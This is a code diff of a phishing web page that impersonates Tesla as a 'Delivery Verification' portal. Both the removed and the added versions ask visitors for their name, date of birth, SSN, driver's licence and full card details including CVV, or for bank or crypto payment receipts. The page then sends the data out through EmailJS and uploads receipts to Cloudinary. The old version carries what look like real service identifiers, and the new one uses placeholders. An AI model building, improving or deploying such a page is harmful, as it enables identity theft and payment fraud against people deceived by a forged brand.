@@ -1,298 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Tesla Delivery Verification Portal</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background: #f5f5f5;
-    margin: 0;
-    padding: 0;
-    color: #222;
-  }
-  .container {
-    max-width: 480px;
-    margin: 40px auto;
-    background: white;
-    padding: 20px 30px;
-    box-shadow: 0 0 8px rgba(0,0,0,0.1);
-    border-radius: 6px;
-  }
-  .hidden {
-    display: none;
-  }
-  .header img {
-    max-width: 120px;
-    display: block;
-    margin: 0 auto 20px;
-  }
-  h2 {
-    text-align: center;
-    margin-bottom: 25px;
-  }
-  label {
-    display: block;
-    margin: 15px 0 6px;
-    font-weight: bold;
-  }
-  input[type="text"],
-  input[type="date"],
-  input[type="file"],
-  input[type="password"] {
-    width: 100%;
-    padding: 8px 10px;
-    font-size: 16px;
-    border: 1.8px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-  }
-  .btn {
-    background-color: #cc0000;
-    color: white;
-    border: none;
-    padding: 12px 0;
-    width: 100%;
-    border-radius: 5px;
-    font-size: 18px;
-    margin-top: 30px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-  .btn:hover {
-    background-color: #a30000;
-  }
-  .progress-bar {
-    margin-bottom: 30px;
-  }
-  .progress-steps {
-    display: flex;
-    justify-content: space-between;
-    font-size: 14px;
-  }
-  .progress-step {
-    flex: 1;
-    text-align: center;
-    color: #bbb;
-  }
-  .progress-step.completed {
-    color: #5cb85c;
-    font-weight: bold;
-  }
-  .progress-step.active {
-    color: #cc0000;
-    font-weight: bold;
-  }
-  .progress-line-container {
-    height: 4px;
-    background: #ddd;
-    border-radius: 3px;
-    margin-top: 8px;
-  }
-  .progress-indicator {
-    height: 4px;
-    background: #cc0000;
-    border-radius: 3px;
-    width: 0%;
-  }
-  .payment-methods {
-    display: flex;
-    justify-content: space-around;
-    margin-bottom: 20px;
-  }
-  .payment-method {
-    padding: 12px 20px;
-    border: 2px solid #ccc;
-    border-radius: 6px;
-    cursor: pointer;
-    user-select: none;
-    transition: border-color 0.3s ease, background-color 0.3s ease;
-  }
-  .payment-method.active {
-    border-color: #cc0000;
-    background-color: #fceaea;
-    font-weight: bold;
-  }
-  .payment-section {
-    margin-bottom: 20px;
-  }
-  .summary-box {
-    background: #f0f0f0;
-    border-radius: 6px;
-    padding: 15px 20px;
-    margin-top: 25px;
-  }
-  .summary-row {
-    display: flex;
-    justify-content: space-between;
-    padding: 6px 0;
-    border-bottom: 1px solid #ddd;
-  }
-  .summary-row.total {
-    font-weight: bold;
-    font-size: 18px;
-    color: #cc0000;
-  }
-  .security-badge {
-    display: flex;
-    align-items: center;
-    font-size: 13px;
-    color: #5cb85c;
-    margin-top: 20px;
-    font-weight: 600;
-  }
-  .footer {
-    margin-top: 40px;
-    font-size: 12px;
-    color: #888;
-    text-align: center;
-  }
-  a {
-    color: #cc0000;
-    text-decoration: none;
-  }
-  a:hover {
-    text-decoration: underline;
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Tesla Delivery Verification</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      background: #f5f5f5;
+      color: #333;
+    }
+    .container {
+      max-width: 480px;
+      margin: 30px auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+      padding: 20px;
+    }
+    .header {
+      text-align: center;
+      padding: 10px 0;
+    }
+    .header img {
+      max-width: 140px;
+    }
+    h2 {
+      font-weight: 500;
+      margin-bottom: 15px;
+    }
+    .form-group {
+      margin-bottom: 14px;
+    }
+    .form-group label {
+      font-weight: 500;
+      display: block;
+      margin-bottom: 6px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 8px 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background: #cc0000;
+      color: #fff;
+      text-align: center;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 15px;
+    }
+    .btn:hover {
+      background: #a30000;
+    }
+    .payment-methods {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .payment-method {
+      flex: 1;
+      padding: 10px;
+      border: 2px solid #ccc;
+      text-align: center;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .payment-method.active {
+      border-color: #cc0000;
+      background: #ffeaea;
+    }
+    .hidden {
+      display: none;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
 
-<!-- Page 1: Identity -->
+<!-- Page 1: Identity Verification -->
 <div class="container" id="identity-page">
   <div class="header">
-    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla" />
+    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
   </div>
-  <h2>Step 1: Verify Identity</h2>
-  <label for="fullname">Full Legal Name*</label>
-  <input type="text" id="fullname" name="fullname" required />
-  
-  <label for="dob">Date of Birth*</label>
-  <input type="date" id="dob" name="dob" required />
-  
-  <label for="ssn">Social Security Number*</label>
-  <input type="text" id="ssn" name="ssn" maxlength="9" placeholder="e.g. 123456789" required />
-  
-  <label for="dl">Driver's License Number*</label>
-  <input type="text" id="dl" name="dl" required />
-  
-  <button class="btn" onclick="showPage('payment-page')">Next: Payment</button>
+  <h2>Identity Verification</h2>
+  <div class="form-group">
+    <label>Full Legal Name</label>
+    <input type="text" id="fullname">
+  </div>
+  <div class="form-group">
+    <label>Date of Birth</label>
+    <input type="date" id="dob">
+  </div>
+  <div class="form-group">
+    <label>Last 4 of SSN</label>
+    <input type="text" id="ssn" maxlength="4">
+  </div>
+  <div class="form-group">
+    <label>Driver's License Number</label>
+    <input type="text" id="dl">
+  </div>
+  <button class="btn" onclick="showPage('payment-page')">Continue to Payment</button>
 </div>
 
 <!-- Page 2: Payment -->
 <div class="container hidden" id="payment-page">
   <div class="header">
-    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla" />
+    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
   </div>
-  <h2>Step 2: Payment Details</h2>
-
+  <h2>Select Payment Method</h2>
   <div class="payment-methods">
-    <div class="payment-method active" onclick="selectPayment('credit-card')">Credit/Debit Card</div>
-    <div class="payment-method" onclick="selectPayment('bank-transfer')">Bank Transfer</div>
+    <div class="payment-method" onclick="selectPayment('credit-card')">Credit/Debit</div>
+    <div class="payment-method" onclick="selectPayment('bank-transfer')">Bank</div>
     <div class="payment-method" onclick="selectPayment('crypto')">Crypto</div>
   </div>
 
-  <!-- Credit/Debit Card -->
-  <div id="credit-card-payment" class="payment-section">
-    <label for="card-number">Card Number*</label>
-    <input type="text" id="card-number" name="card-number" maxlength="19" placeholder="xxxx xxxx xxxx xxxx" required />
-    
-    <label for="expiry">Expiration Date*</label>
-    <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY" required />
-    
-    <label for="cvv">Security Code*</label>
-    <input type="password" id="cvv" name="cvv" maxlength="4" placeholder="CVV" required />
-    
-    <label for="card-name">Name on Card*</label>
-    <input type="text" id="card-name" name="card-name" required />
+  <!-- Credit Card Payment Form -->
+  <div id="credit-card-payment" class="hidden">
+    <div class="form-group">
+      <label>Card Number</label>
+      <input type="text" id="card-number">
+    </div>
+    <div class="form-group">
+      <label>Expiry Date</label>
+      <input type="text" id="expiry" placeholder="MM/YY">
+    </div>
+    <div class="form-group">
+      <label>CVV</label>
+      <input type="text" id="cvv">
+    </div>
+    <div class="form-group">
+      <label>Name on Card</label>
+      <input type="text" id="card-name">
+    </div>
   </div>
 
-  <!-- Bank Transfer -->
-  <div id="bank-transfer-payment" class="payment-section hidden">
-    <label for="bank-receipt">Upload Bank Transfer Receipt*</label>
-    <input type="file" id="bank-receipt" name="bank-receipt" accept=".jpg,.jpeg,.png,.pdf" />
-    <div id="bank-file-name" style="margin-top: 6px; font-style: italic; font-size: 14px;">No file selected</div>
+  <!-- Bank Transfer Receipt Upload -->
+  <div id="bank-transfer-payment" class="hidden">
+    <div class="form-group">
+      <label>Upload Payment Receipt</label>
+      <input type="file" id="bank-receipt">
+    </div>
   </div>
 
-  <!-- Crypto -->
-  <div id="crypto-payment" class="payment-section hidden">
-    <label for="crypto-receipt">Upload Crypto Payment Receipt*</label>
-    <input type="file" id="crypto-receipt" name="crypto-receipt" accept=".jpg,.jpeg,.png,.pdf" />
-    <div id="crypto-file-name" style="margin-top: 6px; font-style: italic; font-size: 14px;">No file selected</div>
+  <!-- Crypto Receipt Upload -->
+  <div id="crypto-payment" class="hidden">
+    <div class="form-group">
+      <label>Upload Crypto Payment Proof</label>
+      <input type="file" id="crypto-receipt">
+    </div>
   </div>
 
   <button class="btn" id="complete-payment-btn" onclick="processPayment()">Complete Payment</button>
 </div>
-
-    <!-- Page 3: Confirmation -->
+  <!-- Page 3: Confirmation -->
 <div class="container hidden" id="confirmation-page">
   <div class="header">
-    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla" />
+    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
   </div>
-  <h2>Your Tesla Delivery is Confirmed!</h2>
-
-  <div class="summary-box">
-    <div class="summary-row"><span>Full Name:</span><span id="conf-fullname"></span></div>
-    <div class="summary-row"><span>Date of Birth:</span><span id="conf-dob"></span></div>
-    <div class="summary-row"><span>SSN:</span><span id="conf-ssn"></span></div>
-    <div class="summary-row"><span>Driver's License:</span><span id="conf-dl"></span></div>
-    <div class="summary-row"><span>Payment Method:</span><span id="conf-payment-method"></span></div>
-    <div class="summary-row credit-card-details hidden" id="conf-card-details">
-      <span>Card Number:</span><span id="conf-card-number"></span>
-    </div>
-    <div class="summary-row credit-card-details hidden" id="conf-expiry">
-      <span>Expiration Date:</span><span id="conf-expiration"></span>
-    </div>
-    <div class="summary-row credit-card-details hidden" id="conf-cvv">
-      <span>Security Code:</span><span>***</span>
-    </div>
-    <div class="summary-row credit-card-details hidden" id="conf-card-name">
-      <span>Name on Card:</span><span id="conf-name-on-card"></span>
-    </div>
-    <div class="summary-row receipt-link hidden" id="conf-receipt-row">
-      <span>Receipt URL:</span>
-      <a href="#" id="conf-receipt-url" target="_blank" rel="noopener noreferrer">View Receipt</a>
-    </div>
-    <div class="summary-row total"><span>Amount Paid:</span><span>$2,285.00</span></div>
-  </div>
-
-  <button class="btn" onclick="alert('This is a demo; no real receipt is generated.')">Download Receipt</button>
-
-  <div class="security-badge" style="justify-content:center; margin-top: 15px;">
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
-      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-    </svg>
-    Transaction ID: TES-78912345-2024
-  </div>
+  <h2>Delivery Confirmed!</h2>
+  <p>Thank you for verifying your identity and completing your payment. A confirmation has been sent to your email.</p>
+  <div class="footer">Tesla Motors © 2025</div>
 </div>
 
-<div class="footer">
-  <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
-  <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
-</div>
-
-<!-- EmailJS and Cloudinary Integration -->
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script src="https://upload-widget.cloudinary.com/global/all.js"></script>
-
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script src="https://widget.Cloudinary.com/v2.0/global/all.js"></script>
 <script>
-  emailjs.init("1-W3uHSnlpZGDZ1i3");
+  // Initialize EmailJS
+  emailjs.init("YOUR_EMAILJS_USER_ID");
 
-  // Page navigation helper
   function showPage(pageId) {
     document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
     document.getElementById(pageId).classList.remove('hidden');
   }
 
-  // Payment method selection UI
   function selectPayment(method) {
     document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
-    document.querySelector(`.payment-method[onclick="selectPayment('${method}')"]`).classList.add('active');
+    document.querySelectorAll('#credit-card-payment, #bank-transfer-payment, #crypto-payment').forEach(el => el.classList.add('hidden'));
 
-    document.getElementById('credit-card-payment').classList.add('hidden');
-    document.getElementById('bank-transfer-payment').classList.add('hidden');
-    document.getElementById('crypto-payment').classList.add('hidden');
+    document.querySelector(`[onclick="selectPayment('${method}')"]`).classList.add('active');
 
     if (method === 'credit-card') {
       document.getElementById('credit-card-payment').classList.remove('hidden');
@@ -303,143 +202,86 @@
     }
   }
 
-  // File input filename update
-  document.getElementById('bank-receipt').addEventListener('change', function(e) {
-    document.getElementById('bank-file-name').textContent = e.target.files[0]?.name || 'No file selected';
-  });
+  function processPayment() {
+    const fullName = document.getElementById('fullname').value;
+    const dob = document.getElementById('dob').value;
+    const ssn = document.getElementById('ssn').value;
+    const dl = document.getElementById('dl').value;
 
-  document.getElementById('crypto-receipt').addEventListener('change', function(e) {
-    document.getElementById('crypto-file-name').textContent = e.target.files[0]?.name || 'No file selected';
-  });
+    const selectedPayment = document.querySelector('.payment-method.active')?.textContent;
 
-  // Main payment processing function
-  async function processPayment() {
-    const payButton = document.getElementById('complete-payment-btn');
-    const originalText = payButton.textContent;
-    payButton.textContent = 'Processing...';
-    payButton.disabled = true;
+    let templateParams = {
+      fullname: fullName,
+      dob: dob,
+      ssn: ssn,
+      dl: dl,
+      paymentMethod: selectedPayment
+    };
 
-    try {
-      // Validate identity fields
-      const requiredIds = ['fullname', 'dob', 'ssn', 'dl'];
-      for (const id of requiredIds) {
-        const field = document.getElementById(id);
-        if (!field.value.trim()) {
-          throw new Error('Please complete all required fields.');
-        }
-      }
-
-      // Determine payment method
-      const paymentMethodElement = document.querySelector('.payment-method.active');
-      if (!paymentMethodElement) throw new Error('Please select a payment method.');
-      const paymentMethod = paymentMethodElement.textContent.trim();
-
-      // Prepare EmailJS params
-      const params = {
-        full_legal_name: document.getElementById('fullname').value.trim(),
-        date_of_birth: document.getElementById('dob').value,
-        social_security_number: document.getElementById('ssn').value.trim(),
-        driver_license_number: document.getElementById('dl').value.trim(),
-        payment_method: paymentMethod,
-        total_amount: '$2,285.00',
-        delivery_date: 'October 14, 2024',
-        vin_number: '7SAYGDEF5PF123456',
-        delivery_address: '123 Main St, Anytown, CA 90210',
-      };
-
-      if (paymentMethod === 'Credit/Debit Card') {
-        // Validate card details
-        const cardNumber = document.getElementById('card-number').value.trim();
-        const expiry = document.getElementById('expiry').value.trim();
-        const cvv = document.getElementById('cvv').value.trim();
-        const cardName = document.getElementById('card-name').value.trim();
-        if (!cardNumber || !expiry || !cvv || !cardName) {
-          throw new Error('Please complete all credit card fields.');
-        }
-        params.card_number = cardNumber;
-        params.expiration_date = expiry;
-        params.security_code = cvv;
-        params.name_on_card = cardName;
-      } else {
-        // Bank Transfer or Crypto - upload receipt
-        const fileInputId = paymentMethod === 'Bank Transfer' ? 'bank-receipt' : 'crypto-receipt';
-        const fileInput = document.getElementById(fileInputId);
-        if (!fileInput.files.length) {
-          throw new Error('Please upload your payment receipt.');
-        }
-
-        // Cloudinary upload widget setup
-        const cloudinaryWidget = cloudinary.createUploadWidget({
-          cloudName: 'do9yjpizs',
-          uploadPreset: 'unsigned_preset',
-          multiple: false,
-          sources: ['local'],
-          clientAllowedFormats: ['png', 'jpeg', 'jpg', 'pdf']
-        }, (error, result) => {
-          if (error) {
-            console.error('Cloudinary upload error:', error);
-          }
-          if (result.event === 'success') {
-            params.receipt_url = result.info.secure_url;
-          }
+    if (selectedPayment === 'Credit/Debit') {
+      templateParams.cardNumber = document.getElementById('card-number').value;
+      templateParams.expiry = document.getElementById('expiry').value;
+      templateParams.cvv = document.getElementById('cvv').value;
+      templateParams.cardName = document.getElementById('card-name').value;
+      sendEmail(templateParams);
+    } 
+    else if (selectedPayment === 'Bank') {
+      const fileInput = document.getElementById('bank-receipt');
+      if (fileInput.files.length > 0) {
+        uploadFileToCloudinary(fileInput.files[0], (url) => {
+          templateParams.bankReceiptUrl = url;
+          sendEmail(templateParams);
         });
-
-        // Open widget and wait for upload success
-        await new Promise((resolve, reject) => {
-          cloudinaryWidget.open();
-          cloudinaryWidget.on('success', () => {
-            resolve();
-          });
-          cloudinaryWidget.on('error', (err) => {
-            reject(err);
-          });
-        });
-      }
-
-      // Send email
-      const emailResponse = await emailjs.send(
-        'service_pveujll',
-        'template_zqpc6bx',
-        params
-      );
-
-      if (emailResponse.status === 200) {
-        showConfirmation(params);
-        showPage('confirmation-page');
       } else {
-        throw new Error('Email sending failed.');
+        alert('Please upload your bank transfer receipt.');
       }
-    } catch (error) {
-      alert('Error: ' + error.message);
-      console.error('Processing error:', error);
-    } finally {
-      payButton.textContent = originalText;
-      payButton.disabled = false;
+    } 
+    else if (selectedPayment === 'Crypto') {
+      const fileInput = document.getElementById('crypto-receipt');
+      if (fileInput.files.length > 0) {
+        uploadFileToCloudinary(fileInput.files[0], (url) => {
+          templateParams.cryptoReceiptUrl = url;
+          sendEmail(templateParams);
+        });
+      } else {
+        alert('Please upload your crypto payment proof.');
+      }
+    } 
+    else {
+      alert('Please select a payment method.');
     }
   }
 
-  // Show confirmation details
-  function showConfirmation(data) {
-    document.getElementById('conf-fullname').textContent = data.full_legal_name;
-    document.getElementById('conf-dob').textContent = data.date_of_birth;
-    document.getElementById('conf-ssn').textContent = data.social_security_number;
-    document.getElementById('conf-dl').textContent = data.driver_license_number;
-    document.getElementById('conf-payment-method').textContent = data.payment_method;
+  function uploadFileToCloudinary(file, callback) {
+    const cloudName = 'YOUR_CLOUD_NAME';
+    const uploadPreset = 'YOUR_UPLOAD_PRESET';
 
-    if (data.payment_method === 'Credit/Debit Card') {
-      document.querySelectorAll('.credit-card-details').forEach(el => el.classList.remove('hidden'));
-      document.getElementById('conf-card-number').textContent = data.card_number;
-      document.getElementById('conf-expiration').textContent = data.expiration_date;
-      document.getElementById('conf-name-on-card').textContent = data.name_on_card;
-      document.getElementById('conf-receipt-row').classList.add('hidden');
-    } else {
-      document.querySelectorAll('.credit-card-details').forEach(el => el.classList.add('hidden'));
-      if (data.receipt_url) {
-        document.getElementById('conf-receipt-url').href = data.receipt_url;
-        document.getElementById('conf-receipt-row').classList.remove('hidden');
-      }
-    }
+    const formData = new FormData();
+    formData.append('file', file);
+    formData.append('upload_preset', uploadPreset);
+
+    fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      callback(data.secure_url);
+    })
+    .catch(() => {
+      alert('File upload failed.');
+    });
+  }
+
+  function sendEmail(params) {
+    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', params)
+    .then(() => {
+      showPage('confirmation-page');
+    }, () => {
+      alert('Failed to send email. Try again.');
+    });
   }
 </script>
+
 </body>
 </html>
